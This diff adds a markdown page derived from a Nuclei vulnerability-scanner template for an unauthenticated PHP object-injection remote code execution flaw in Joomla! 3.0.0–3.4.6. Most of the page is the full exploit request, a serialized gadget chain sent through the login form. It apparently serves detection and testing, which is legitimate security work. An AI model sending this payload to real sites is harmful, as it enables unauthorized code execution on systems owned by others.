@@ -1,0 +1,27 @@
+# Nuclei Template: Joomla! CMS <=3.4.6 - Remote Code Execution
+**Template ID:** rusty-joomla
+**Vulnerability Class:** Code Injection
+**Severity:** Critical
+**CWE:** CWE-94
+**Source:** Nuclei Template (`rusty-joomla.yaml`)
+
+## Vulnerability Information & PoC
+
+## Description
+Joomla! CMS 3.0.0 through the 3.4.6 release contains an unauthenticated PHP object injection that leads to remote code execution.
+
+## Steps to reproduce / Exploit Payload
+```http
+GET / HTTP/1.1
+Host: {{Hostname}}
+
+POST / HTTP/1.1
+Host: {{Hostname}}
+Content-Type: application/x-www-form-urlencoded
+
+username=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0&password=AAA%22%3Bs%3A11%3A%22maonnalezzo%22%3BO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A7%3A%22print_r%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A40%3A%22http%3A%2F%2Frusty.jooml%2F%3Bpkwxhxqxmdkkmscotwvh%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7Ds%3A6%3A%22return%22%3Bs%3A102%3A&option=com_users&task=user.login&{{csrf}}=1
+```
+
+## References
+- https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/
+- https://github.com/kiks7/rusty_joomla_rce
